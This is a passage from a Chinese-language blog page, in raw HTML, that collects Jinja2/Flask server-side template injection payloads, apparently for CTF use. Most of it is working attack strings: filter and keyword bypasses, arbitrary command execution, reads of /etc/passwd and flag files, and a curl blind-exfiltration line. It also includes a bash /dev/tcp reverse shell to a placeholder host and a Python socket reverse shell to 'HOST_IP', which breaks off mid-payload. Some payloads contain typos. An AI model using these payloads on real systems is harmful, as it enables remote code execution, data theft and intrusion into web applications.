class="hljs-name">request.pragma.6</span>)|attr(<span class="hljs-name">request.pragma.7</span>)()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">  headers 可以是：</span><br><span class="language-xml"></span><br><span class="language-xml">  - Pragma: __globals__</span><br><span class="language-xml"></span><br><span class="language-xml">  - Pragma: __getitem__</span><br><span class="language-xml"></span><br><span class="language-xml">  - Pragma: __builtins__</span><br><span class="language-xml"></span><br><span class="language-xml">  - Pragma: __import__</span><br><span class="language-xml"></span><br><span class="language-xml">  - Pragma: os</span><br><span class="language-xml"></span><br><span class="language-xml">  - Pragma: popen</span><br><span class="language-xml"></span><br><span class="language-xml">  - Pragma: cat flag.txt</span><br><span class="language-xml"></span><br><span class="language-xml">  - Pragma: read</span><br><span class="language-xml">  ### 文件写入：</span><br><span class="language-xml"></span><br><span class="language-xml">- [].__class__.__base__.__base__.__subclasses__()[40](&#x27;/tmp/1&#x27;,&#x27;w&#x27;).write(&#x27;hello&#x27;)</span><br><span class="language-xml"></span><br><span class="language-xml">动态执行：</span><br><span class="language-xml"></span><br><span class="language-xml">例如 ?input=ls</span><br><span class="language-xml"></span><br><span class="language-xml">&#123;% for x in().__class__.__base__.__subelasses__() %&#125;&#123;% if &quot;warning&quot; in x.__name__%&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">x</span>().__module.__builtins__[&#x27;__import__&#x27;](<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">request.args.input</span>).read()&#125;&#125;</span><span class="language-xml">&#123;%endif%&#125;&#123;%endfor%&#125;`</span><br></code></pre></td></tr></table></figure><h3 id="其他利用"><a href="#其他利用" class="headerlink" title="其他利用"></a><code>其他利用</code></h3><ul><li><code>通过编写一个邪恶的配置文件来利用 SSTI：</code><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="language-xml">*# evil config</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123; &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/tmp/evilconfig.cfg&#x27;, &#x27;w&#x27;).write(&#x27;from subprocess import check_output\n\nRUNCMD = check_output\n&#x27;) &#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"># load the evil config</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123; config.from_pyfile(&#x27;/tmp/evilconfig.cfg&#x27;) &#125;&#125;</span><span class="language-xml">  </span><br><span class="language-xml"></span><br><span class="language-xml"># connect to evil host</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123; config[&#x27;RUNCMD&#x27;](&#x27;/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/x.x.x.x/8000 0&gt;&amp;1&quot;&#x27;,shell=True) &#125;&#125;</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="关键字过滤-利用request"><a href="#关键字过滤-利用request" class="headerlink" title="关键字过滤 - 利用request"></a><code>关键字过滤 - 利用request</code></h3><p><code>利用request, args特性（cookie等）：</code></p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">- _class_</span><br><span class="language-xml">- </span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__bases__.__getitem__</span>(<span class="hljs-name">0</span>).__subclasses__().__pop(<span class="hljs-name">40</span>)(<span class="hljs-name">request.args.path</span>).read()&#125;&#125;</span><span class="language-xml">&amp;path=/etc/passwd</span><br><span class="language-xml">- http://localhost:5000/?exploit=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">request</span>|attr((<span class="hljs-name">request.args.use</span>*<span class="hljs-number">2</span>,request.args.class,request.args.use*<span class="hljs-number">2</span>)|join)&#125;&#125;</span><span class="language-xml">&amp;class=class&amp;use-_</span><br><span class="language-xml">- http://localhost:5000/?exploit=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">request</span>|attr(<span class="hljs-name">request.args_getlist</span>(<span class="hljs-name">request.args.l</span>)|join)&#125;&#125;</span><span class="language-xml">&amp;l=a&amp;a=_&amp;a=_&amp;a=class&amp;a=_&amp;a=_</span><br></code></pre></td></tr></table></figure><h3 id="盲命令执行"><a href="#盲命令执行" class="headerlink" title="盲命令执行"></a><code>盲命令执行</code></h3><p><code>利用curl将执行结果带出来：</code></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">｛% <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.func_globals.linecache.os.<span class="hljs-keyword">popen</span>(<span class="hljs-string">&#x27;curl http://ip: port?i=whoami&#x27;</span>).read()==<span class="hljs-string">&#x27;p&#x27;</span> %&#125;<span class="hljs-number">1</span>&#123;%endif %&#125;<br></code></pre></td></tr></table></figure><h3 id="绕过禁用的关键命令"><a href="#绕过禁用的关键命令" class="headerlink" title="绕过禁用的关键命令"></a><code>绕过禁用的关键命令</code></h3><p><code>一些禁用了ls，cat，os等关键命令的bypass：</code></p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqf">- [].<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>.<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">72</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;d&#x27;</span>+<span class="hljs-string">&#x27;1&#x27;</span>+<span class="hljs-string">&#x27;r&#x27;</span>)<br>- [].<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>.<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">59</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;linecache&#x27;</span>].<span class="hljs-variable">__dict__</span>[<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>].system(<span class="hljs-string">&#x27;l&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>)<br>- [].<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>.<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">59</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__func_globals</span>[<span class="hljs-string">&#x27;linecache&#x27;</span>].<span class="hljs-variable">__dict__</span>.<span class="hljs-built_in">values</span>()[<span class="hljs-number">12</span>].system(<span class="hljs-string">&#x27;l&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="利用getattribute-字符串拼接"><a href="#利用getattribute-字符串拼接" class="headerlink" title="利用getattribute()+ 字符串拼接"></a><code>利用getattribute()+ 字符串拼接</code></h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">- <span class="hljs-selector-attr">[]</span>.__class__.__base__.<span class="hljs-built_in">__subclasses__</span>()<span class="hljs-selector-attr">[72]</span>.__init__.<span class="hljs-built_in">__getattribute__</span>(<span class="hljs-string">&#x27;__global&#x27;</span>+<span class="hljs-string">&#x27;s__&#x27;</span>)<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;os&#x27;</span>]</span><span class="hljs-selector-class">.system</span>(<span class="hljs-string">&#x27;dir&#x27;</span>)<br>- <span class="hljs-selector-attr">[]</span>.__class__.__base__.<span class="hljs-built_in">__subclasses__</span>()<span class="hljs-selector-attr">[72]</span>.__init__.<span class="hljs-built_in">__getattribute__</span>(<span class="hljs-string">&#x27;5f5f676c6f62616c735f5f&#x27;</span><span class="hljs-selector-class">.decode</span>(<span class="hljs-string">&#x27;hex&#x27;</span>))<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;os&#x27;</span>]</span><span class="hljs-selector-class">.system</span>(<span class="hljs-string">&#x27;dir&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="关键字键字过滤-利用hex编码"><a href="#关键字键字过滤-利用hex编码" class="headerlink" title="关键字键字过滤 - 利用hex编码"></a><code>关键字键字过滤 - 利用hex编码</code></h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">- __builtins__<br>- ().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[&#x27;\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">62</span>\<span class="hljs-keyword">x</span><span class="hljs-number">75</span>\<span class="hljs-keyword">x</span><span class="hljs-number">69</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">74</span>\<span class="hljs-keyword">x</span><span class="hljs-number">69</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">73</span>\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f&#x27;]<br></code></pre></td></tr></table></figure><h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤[]"></a><code>过滤[]</code></h3><p><code>引入__getitem__调用字典中的键值，比如说a[&#39;b&#39;]就可以用a.getitem(&#39;b&#39;)来表示：</code></p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">- ?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">a.__init__.__globals__.__getitem__</span>(<span class="hljs-name">request.cookies.x</span>).eval(<span class="hljs-name">request.cookies.y</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">- cookie:x=__builtins__;y=__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()</span><br></code></pre></td></tr></table></figure><h3 id="常见过滤（’’，’-mro-and-base"><a href="#常见过滤（’’，’-mro-and-base" class="headerlink" title="常见过滤（’’，’, &#39;mro&#39; and &#39;base&#39;)"></a><code>常见过滤（’’，’, &#39;mro&#39; and &#39;base&#39;)</code></h3><p><code>Flask注入需要大量.，_，如果被过滤了可以用[]替代.，16进制编码替代_：</code></p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">- </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">request</span>|attr(<span class="hljs-name">&#x27;application&#x27;</span>)|attr(<span class="hljs-name">&#x27;\x5f\x5fglobals\x5f\x5f&#x27;</span>)|attr(<span class="hljs-name">&#x27;\x5f\x5fgetitem\x5f\×5f&#x27;</span>)(<span class="hljs-name">&#x27;\x5f\x5fbuiltins\x5f\×5f&#x27;</span>)|attr(<span class="hljs-name">&#x27;\x5f\x5fgetitem\x5f\×5f&#x27;</span>)(<span class="hljs-name">&#x27;\x5f\x5fimport\x5f|x5f&#x27;</span>)(<span class="hljs-name">&#x27;os&#x27;</span>)|attr(<span class="hljs-name">&#x27;popen&#x27;</span>)(<span class="hljs-name">&#x27;id&#x27;</span>)|attr(<span class="hljs-name">&#x27;read&#x27;</span>)()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">- </span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">[&quot;\x5F\x5Fclass\x5F\x5F&quot;]</span>[&quot;\x5F\x5Fbases\x5F\x5F&quot;][0][&quot;\x5F\x5Fsubclasses\x5F\x5F&quot;]()[91][&quot;get\x5Fdata&quot;](<span class="hljs-name">0</span>, <span class="hljs-string">&quot;/proc/self/fd/3&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">- &#123; &#123;()[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fbases\x5f\x5f&quot;][0][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()&#125;&#125;//寻找可用引用</span><br></code></pre></td></tr></table></figure><h3 id="导入模块"><a href="#导入模块" class="headerlink" title="导入模块"></a><code>导入模块</code></h3><ul><li><code>__import__(&#39;os&#39;)</code></li><li><code>__import__(&quot;bf&quot;.decode(&#39;rot_13&#39;))</code></li><li><code>__import__(&#39;o&#39;+&#39;s&#39;).system(&quot;whoami&quot;)</code></li><li><code>__import__(&#39;so&#39;[::-1]).system(&#39;whoami&#39;)</code></li><li><code>eval(&#39;)&quot;imaohw&quot;(metsys.)&quot;so&quot;(__tropmi__&#39;[::-1])</code></li><li><code>exec(&#39;)&quot;imaohw&quot;(metsys.so ;so_tropmi&#39;[::-1])</code></li><li><code>import importlib;importlib.import_module(&quot;os&quot;).system(&quot;whoami&quot;)</code></li><li><code>import sys;sys.modules[&#39;os&#39;]=&#39;not allowed&#39;;del sys.modules[&#39;os&#39;];import os</code></li><li><code>a=open(&#39;/usr/lib/python3.7/os.py&#39;).read();exec(a);system(&quot;whoami&quot;)</code></li><li><code>execfile(&#39;/usr/lib/python2.7/os.py&#39;);system (&quot;whoami&quot;) # ONLY Python2</code></li></ul><h3 id="下划线"><a href="#下划线" class="headerlink" title="下划线"></a><code>下划线</code></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>((),<span class="hljs-built_in">dir</span>(<span class="hljs-number">0</span>)[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]*<span class="hljs-number">2</span>+<span class="hljs-string">&#x27;class&#x27;</span>+<span class="hljs-built_in">dir</span>(<span class="hljs-number">0</span>)[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]*<span class="hljs-number">2</span>),<span class="hljs-built_in">dir</span>(<span class="hljs-number">0</span>)[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]*<span class="hljs-number">2</span>+<span class="hljs-string">&#x27;bases&#x27;</span>+<span class="hljs-built_in">dir</span>(<span class="hljs-number">0</span>)[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]*<span class="hljs-number">2</span>),<span class="hljs-built_in">dir</span>(<span class="hljs-number">0</span>)[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]*<span class="hljs-number">2</span>+<span class="hljs-string">&#x27;getitem&#x27;</span>+<span class="hljs-built_in">dir</span>(<span class="hljs-number">0</span>)[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]*<span class="hljs-number">2</span>)(<span class="hljs-number">0</span>),<span class="hljs-built_in">dir</span>(<span class="hljs-number">0</span>)[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]*<span class="hljs-number">2</span>+<span class="hljs-string">&#x27;subclasses&#x27;</span>+<span class="hljs-built_in">dir</span>(<span class="hljs-number">0</span>)[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]*<span class="hljs-number">2</span>)(),<span class="hljs-string">&#x27;pop&#x27;</span>)(<span class="hljs-number">37</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">*?name=&#123;&#123;(x|attr(request.cookies.x1)|attr(request.cookies.x2)|attr(request.cookies.x3))(request.cookies.x4).<span class="hljs-built_in">eval</span>(request.cookies.x5)&#125;&#125;<br></code></pre></td></tr></table></figure><p><code>Cookie传参：</code></p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">x1=<span class="hljs-variable">__init__</span>;x2=<span class="hljs-variable">__globals__</span>;x3=<span class="hljs-variable">__getitem__</span>;x4=<span class="hljs-variable">__builtins__</span>;x5=<span class="hljs-variable">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;cat /f*&#x27;</span>).read()<br></code></pre></td></tr></table></figure><h3 id="使用绕过再借助print-回显"><a href="#使用绕过再借助print-回显" class="headerlink" title="使用绕过再借助print()回显&#96;"></a><code>使用</code>绕过再借助print()回显&#96;</h3><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="language-xml">- ?name=</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">print</span>((abc<span class="hljs-punctuation">|</span>attr(request.cookies.a)<span class="hljs-punctuation">|</span>attr(request.cookies.b)<span class="hljs-punctuation">|</span>attr(request.cookies.c))(request.cookies.d).eval(request.cookies.e))<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml">- Cookie:a=__init__;b=__globals__;c=__getitem__;d=__builtins__;e=__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()</span><br><span class="language-xml">- ?name=</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">print</span>((x<span class="hljs-punctuation">|</span>attr(request.cookies.x<span class="hljs-number">1</span>)<span class="hljs-punctuation">|</span>attr(request.cookies.x<span class="hljs-number">2</span>)<span class="hljs-punctuation">|</span>attr(request.cookies.x<span class="hljs-number">3</span>))(request.cookies.x<span class="hljs-number">4</span>).eval(request.cookies.x<span class="hljs-number">5</span>))<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">- </span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">print</span>(lipsum<span class="hljs-punctuation">|</span>attr(%<span class="hljs-number">27</span>\u<span class="hljs-number">005</span>f\x<span class="hljs-number">5</span>f\u<span class="hljs-number">0067</span>\x<span class="hljs-number">6</span>c\u<span class="hljs-number">006</span>f\x<span class="hljs-number">62</span>\x<span class="hljs-number">61</span>\x<span class="hljs-number">6</span>c\x<span class="hljs-number">73</span>\x<span class="hljs-number">5</span>f\x<span class="hljs-number">5</span>f%<span class="hljs-number">27</span>))<span class="hljs-template-tag">%&#125;</span><br></code></pre></td></tr></table></figure><h3 id="过滤了数字"><a href="#过滤了数字" class="headerlink" title="过滤了数字"></a><code>过滤了数字</code></h3><ul><li><code>构造出1: &#123;&#123;(dict(e=a)|join|count)&#125;&#125;</code></li></ul><h3 id="关键字绕过"><a href="#关键字绕过" class="headerlink" title="关键字绕过"></a><code>关键字绕过</code></h3><ul><li><code>class, base</code><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-variable">&#123;&#123;dict(__cl=a,ass__=a)|<span class="hljs-name">join</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><code>还可以使用全角的数字绕过：</code></li><li><code>０１２３４５６７８９</code></li></ul><h3 id="SSTI武器库"><a href="#SSTI武器库" class="headerlink" title="SSTI武器库"></a><code>SSTI武器库</code></h3><ol><li><code>任意命令执行:</code><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-name">for</span></span> i <span class="hljs-keyword">in</span> &#x27;&#x27;.__class__.__base__.__subclasses__()%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-name">if</span></span> i.__name__ ==&#x27;_wrap_close&#x27;%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name">print</span> i.__init__.__globals__[&#x27;popen&#x27;](&#x27;dir&#x27;).read()%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-name">endif</span></span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-name">endfor</span></span>%&#125;</span><br></code></pre></td></tr></table></figure></li><li><code>任意命令执行:</code><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-variable">&#123;&#123;&quot;&quot;.__class__.__bases__[0]. __subclasses__()[138].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure></li></ol><ul><li><code>这个138对应的类是os._wrap_close，只需要找到这个类的索引就可以利用这个payload</code></li></ul><ol start="3"><li><code>任意命令执行:</code><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-variable">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;)&#125;&#125;</span><br></code></pre></td></tr></table></figure></li><li><code>任意命令执行:</code><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-variable">&#123;&#123;x.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;)&#125;&#125;</span><br></code></pre></td></tr></table></figure></li></ol><ul><li><code>x的含义是可以为任意字母，不仅仅限于x</code></li></ul><ol start="5"><li><code>任意命令执行:</code><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-variable">&#123;&#123;config.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;)&#125;&#125;</span><br></code></pre></td></tr></table></figure></li><li><code>文件读取:</code><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-variable">&#123;&#123;x.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/flag&#x27;, &#x27;r&#x27;).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure></li></ol><ul><li><code>x的含义是可以为任意字母，不仅仅限于x</code></li></ul><h1 id="命令执行-eval"><a href="#命令执行-eval" class="headerlink" title="命令执行_eval"></a><code>命令执行_eval</code></h1><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> x.__init__ is defined and x.__init__.__globals__ is defined and &#x27;eval&#x27; <span class="hljs-keyword">in</span> x.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;].__name__ %&#125;</span><span class="hljs-template-variable">&#123;&#123; x.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;) &#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br></code></pre></td></tr></table></figure><h1 id="命令执行-os-py"><a href="#命令执行-os-py" class="headerlink" title="命令执行_os.py"></a><code>命令执行_os.py</code></h1><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> x.__init__ is defined and x.__init__.__globals__ is defined and &#x27;os&#x27; <span class="hljs-keyword">in</span> x.__init__.__globals__ %&#125;</span><span class="hljs-template-variable">&#123;&#123; x.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read() &#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br></code></pre></td></tr></table></figure><h1 id="命令执行-popen"><a href="#命令执行-popen" class="headerlink" title="命令执行_popen"></a><code>命令执行_popen</code></h1><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> x.__init__ is defined and x.__init__.__globals__ is defined and &#x27;popen&#x27; <span class="hljs-keyword">in</span> x.__init__.__globals__ %&#125;</span><span class="hljs-template-variable">&#123;&#123; x.__init__.__globals__[&#x27;popen&#x27;](&#x27;ls /&#x27;).read() &#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br></code></pre></td></tr></table></figure><h1 id="命令执行-frozen-importlib-BuiltinImporter"><a href="#命令执行-frozen-importlib-BuiltinImporter" class="headerlink" title="命令执行__frozen_importlib.BuiltinImporter"></a><code>命令执行__frozen_importlib.BuiltinImporter</code></h1><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> &#x27;BuiltinImporter&#x27; <span class="hljs-keyword">in</span> x.__name__ %&#125;</span><span class="hljs-template-variable">&#123;&#123; x[&quot;load_module&quot;](&quot;os&quot;)[&quot;popen&quot;](&quot;ls /&quot;).read() &#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br></code></pre></td></tr></table></figure><h1 id="命令执行-linecache"><a href="#命令执行-linecache" class="headerlink" title="命令执行_linecache"></a><code>命令执行_linecache</code></h1><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> x.__init__ is defined and x.__init__.__globals__ is defined and &#x27;linecache&#x27; <span class="hljs-keyword">in</span> x.__init__.__globals__ %&#125;</span><span class="hljs-template-variable">&#123;&#123; x.__init__.__globals__[&#x27;linecache&#x27;][&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read() &#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br></code></pre></td></tr></table></figure><h1 id="命令执行-exec-无回显故反弹shell"><a href="#命令执行-exec-无回显故反弹shell" class="headerlink" title="命令执行_exec(无回显故反弹shell)"></a><code>命令执行_exec(无回显故反弹shell)</code></h1><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> x.__init__ is defined and x.__init__.__globals__ is defined and &#x27;exec&#x27; <span class="hljs-keyword">in</span> x.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;exec&#x27;].__name__ %&#125;</span><span class="hljs-template-variable">&#123;&#123; x.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;exec&#x27;](&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;HOST_IP&quot;,Port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#x27;)&#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span 